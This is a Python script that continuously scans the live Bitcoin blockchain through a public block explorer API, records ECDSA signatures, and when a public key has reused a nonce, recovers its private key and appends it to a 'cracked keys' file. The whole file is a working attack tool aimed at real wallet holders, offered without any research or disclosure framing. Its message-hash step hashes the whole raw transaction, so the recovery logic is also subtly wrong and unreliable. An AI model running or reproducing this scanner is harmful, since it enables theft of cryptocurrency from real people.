import time
import os
import requests
import hashlib
import sqlite3
from ecdsa import SECP256k1, SigningKey
from bitcoin.core.script import CScript
from bitcoin.core import CTransaction

# Constants
START_BLOCK = 1
DB_PATH = "live_reused_r.sqlite"
LAST_SCANNED_FILE = "last_scanned_block.txt"
POLL_INTERVAL = 30  # seconds between polls

# === Helper Functions ===

def double_sha256(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()

def parse_der_signature(der_sig):
    if len(der_sig) < 8 or der_sig[0] != 0x30:
        raise ValueError("Invalid DER signature")
    r_len = der_sig[3]
    r = int.from_bytes(der_sig[4:4 + r_len], 'big')
    s = int.from_bytes(der_sig[6 + r_len:], 'big')
    return r, s

def recover_privkey(r, s1, s2, z1, z2, n=SECP256k1.order):
    try:
        s_diff = (s1 - s2) % n
        z_diff = (z1 - z2) % n
        s_diff_inv = pow(s_diff, -1, n)
        k = (z_diff * s_diff_inv) % n
        r_inv = pow(r, -1, n)
        d = (r_inv * (k * s1 - z1)) % n
        return d, k
    except Exception:
        return None, None

def derive_compressed_pubkey(privkey_int):
    sk = SigningKey.from_secret_exponent(privkey_int, curve=SECP256k1)
    vk = sk.verifying_key
    x = vk.pubkey.point.x()
    y = vk.pubkey.point.y()
    prefix = b'\x02' if y % 2 == 0 else b'\x03'
    return prefix + x.to_bytes(32, 'big')

def init_db(db_path=DB_PATH):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS signatures (
        r TEXT,
        s TEXT,
        z TEXT,
        pubkey TEXT,
        txid TEXT,
        vin INTEGER
    )''')
    c.execute('CREATE INDEX IF NOT EXISTS idx_r_pub ON signatures (r, pubkey)')
    conn.commit()
    return conn

def save_cracked_key(info):
    with open("live_cracked_keys.txt", "a") as f:
        f.write(info + "\n")

def get_latest_block_height():
    r = requests.get("https://blockstream.info/api/blocks/tip/height")
    r.raise_for_status()
    return int(r.text)

def get_block_hash(height):
    r = requests.get(f"https://blockstream.info/api/block-height/{height}")
    r.raise_for_status()
    return r.text.strip()

def get_block_txs(block_hash):
    r = requests.get(f"https://blockstream.info/api/block/{block_hash}/txids")
    r.raise_for_status()
    return r.json()

def get_tx_hex(txid):
    r = requests.get(f"https://blockstream.info/api/tx/{txid}/hex")
    r.raise_for_status()
    return bytes.fromhex(r.text.strip())

def insert_signature(conn, r, s, z, pubkey, txid, vin):
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM signatures WHERE r=? AND pubkey=? AND s=? AND z=?", (r, pubkey, s, z))
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO signatures VALUES (?, ?, ?, ?, ?, ?)", (r, s, z, pubkey, txid, vin))
        conn.commit()

def check_reused_r(conn, r, pubkey):
    c = conn.cursor()
    c.execute("SELECT s, z, txid, vin FROM signatures WHERE r=? AND pubkey=?", (r, pubkey))
    return c.fetchall()

def load_last_scanned():
    if os.path.exists(LAST_SCANNED_FILE):
        with open(LAST_SCANNED_FILE, "r") as f:
            return int(f.read())
    return START_BLOCK - 1

def save_last_scanned(height):
    with open(LAST_SCANNED_FILE, "w") as f:
        f.write(str(height))

# === Main live scanning loop ===

def live_scan():
    conn = init_db()
    last_height = load_last_scanned()
    print(f"Resuming scan from block {last_height + 1}")

    while True:
        try:
            current_height = get_latest_block_height()
            if current_height > last_height:
                for height in range(last_height + 1, current_height + 1):
                    print(f"\n[📦 Processing block {height}]")
                    block_hash = get_block_hash(height)
                    txids = get_block_txs(block_hash)
                    print(f"  ↳ {len(txids)} transactions")

                    for txid in txids:
                        try:
                            raw = get_tx_hex(txid)
                            tx = CTransaction.deserialize(raw)
                            z = int.from_bytes(double_sha256(raw), 'big')

                            for vin_idx, txin in enumerate(tx.vin):
                                try:
                                    chunks = list(CScript(txin.scriptSig))
                                    if len(chunks) >= 2:
                                        der = bytes(chunks[0])[:-1]  # Remove sighash byte
                                        pubkey = bytes(chunks[1]).hex()
                                        r, s = parse_der_signature(der)

                                        insert_signature(conn, str(r), str(s), str(z), pubkey, txid, vin_idx)

                                        sigs = check_reused_r(conn, str(r), pubkey)
                                        if len(sigs) > 1:
                                            print(f"🚨 Reused nonce detected for pubkey {pubkey[:16]}...")

                                            s1, z1, txid1, vin1 = sigs[0]
                                            s2, z2, txid2, vin2 = sigs[1]
                                            s1, s2, z1, z2 = int(s1), int(s2), int(z1), int(z2)

                                            d, k = recover_privkey(r, s1, s2, z1, z2)
                                            if d:
                                                derived = derive_compressed_pubkey(d).hex()
                                                print(f"🔓 Private key recovered! d={hex(d)}")
                                                print(f"  ↳ Matches pubkey? {derived == pubkey}")
                                                print(f"  ↳ From txids: {txid1}, {txid2}")

                                                save_cracked_key(f"{hex(d)} | pubkey: {derived} | txids: {txid1}, {txid2}")

                                except Exception:
                                    continue
                        except Exception:
                            continue

                    save_last_scanned(height)
                    last_height = height
                    # Be polite to API, avoid hitting rate limits
                    time.sleep(1)
            else:
                print(f"Waiting for new block... Current height: {current_height}")
                time.sleep(POLL_INTERVAL)
        except KeyboardInterrupt:
            print("Stopping live scanner.")
            break
        except Exception as e:
            print(f"Error: {e}. Retrying in {POLL_INTERVAL} seconds.")
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    live_scan()
